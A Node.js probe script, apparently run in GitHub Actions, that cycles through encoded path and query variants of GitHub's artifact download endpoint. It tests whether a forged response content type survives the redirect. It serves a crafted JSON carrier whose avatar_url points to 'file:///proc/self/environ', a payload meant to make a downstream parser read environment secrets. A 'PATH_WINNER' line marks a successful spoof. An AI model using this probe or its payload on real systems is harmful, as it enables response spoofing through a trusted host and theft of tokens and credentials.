'use strict';

// Probe whether caller-controlled download path/query bytes survive GitHub's
// artifact redirect.  Signed URL values are deliberately never logged.

const crypto = require('node:crypto');
const https = require('node:https');

const REPOSITORY = process.env.GITHUB_REPOSITORY;
const ARTIFACT_ID = process.env.ARTIFACT_ID || '12593463850';
const ODD_HEX = '856170706c69636174696f6e2f6a736f6e';

function carrier(repositoryPath) {
  return Buffer.from(JSON.stringify({
    full_name: repositoryPath,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette parser probe carrier',
    stargazers_count: 0,
  }));
}

function requestUrl(url, {headers = {}} = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({status: response.statusCode || 0, headers: response.headers, body: Buffer.concat(chunks)}));
    });
    req.setTimeout(15000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end();
  });
}

function requestApiPath(path) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      protocol: 'https:',
      hostname: 'api.github.com',
      method: 'GET',
      path,
      headers: {
        accept: 'application/vnd.github.v3+json',
        authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
        'user-agent': 'repo-cassette-path-probe',
        'x-github-api-version': '2022-11-28',
      },
    }, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({status: response.statusCode || 0, headers: response.headers, body: Buffer.concat(chunks)}));
    });
    req.setTimeout(15000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end();
  });
}

function contentTypeHex(response) {
  const value = Array.isArray(response.headers['content-type'])
    ? response.headers['content-type'][0] : response.headers['content-type'] || '';
  return Buffer.from(value, 'latin1').toString('hex');
}

function locationShape(location) {
  if (!location) return null;
  const url = new URL(location);
  const counts = {};
  for (const key of url.searchParams.keys()) counts[key] = (counts[key] || 0) + 1;
  return {
    host: url.host,
    pathSegments: url.pathname.split('/').filter(Boolean).length,
    pathHash: crypto.createHash('sha256').update(url.pathname).digest('hex').slice(0, 12),
    queryKeys: Object.keys(counts).sort(),
    queryKeyCounts: counts,
    rsctHex: url.searchParams.has('rsct')
      ? Buffer.from(url.searchParams.get('rsct'), 'latin1').toString('hex') : '',
    responseContentTypeHex: url.searchParams.has('response-content-type')
      ? Buffer.from(url.searchParams.get('response-content-type'), 'latin1').toString('hex') : '',
  };
}

async function main() {
  if (!REPOSITORY || !process.env.GITHUB_TOKEN) throw new Error('Actions environment incomplete');
  const repositoryPath = `${REPOSITORY}/actions/artifacts/${ARTIFACT_ID}/zip`;
  const expected = carrier(repositoryPath);
  const prefix = `/repos/${REPOSITORY}/actions/artifacts/${ARTIFACT_ID}/`;
  const nel = '%85application%2Fjson';
  const utf8Nel = '%C2%85application%2Fjson';
  const variants = [
    ['zip-control', 'zip'],
    ['zip-download', 'zip?download=1'],
    ['zip-archive-zip', 'zip?archive_format=zip'],
    ['zip-archive-raw', 'zip?archive_format=raw'],
    ['zip-rsct-nel', `zip?rsct=${nel}`],
    ['zip-rsct-utf8-nel', `zip?rsct=${utf8Nel}`],
    ['zip-response-content-type', `zip?response-content-type=${nel}`],
    ['zip-download-rsct', `zip?download=1&rsct=${nel}`],
    ['zip-rsct-valid-then-nel', `zip?rsct=application%2Fjson&rsct=${nel}`],
    ['zip-rsct-nel-then-valid', `zip?rsct=${nel}&rsct=application%2Fjson`],
    ['zip-encoded-rsct-key', `zip?%72sct=${nel}`],
    ['raw', 'raw'],
    ['json', 'json'],
    ['zip-trailing-slash', 'zip/'],
    ['zip-percent-z', '%7aip'],
    ['zip-percent-i', 'z%69p'],
    ['dot-zip', '%2e/zip'],
    ['zip-dot', 'zip/.'],
    ['encoded-question', `zip%3Frsct%3D${nel}`],
  ];
  for (const [label, suffix] of variants) {
    let first;
    try {
      first = await requestApiPath(prefix + suffix);
    } catch (error) {
      console.log(`PATH_RESULT ${JSON.stringify({label, requestError: error.message})}`);
      continue;
    }
    const location = first.headers.location || '';
    let final = first;
    if (first.status >= 300 && first.status < 400 && location) {
      try { final = await requestUrl(location, {headers: {'user-agent': 'repo-cassette-path-probe'}}); }
      catch (error) {
        console.log(`PATH_RESULT ${JSON.stringify({label, firstStatus: first.status, location: locationShape(location), followError: error.message})}`);
        continue;
      }
    }
    const row = {
      label,
      firstStatus: first.status,
      location: locationShape(location),
      finalStatus: final.status,
      contentTypeHex: contentTypeHex(final),
      bodyMatch: final.body.equals(expected),
      bodyBytes: final.body.length,
    };
    console.log(`PATH_RESULT ${JSON.stringify(row)}`);
    if (row.finalStatus === 200 && row.contentTypeHex === ODD_HEX && row.bodyMatch) {
      console.log(`PATH_WINNER ${JSON.stringify({label, artifactId: ARTIFACT_ID, repositoryPath})}`);
      return;
    }
  }
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
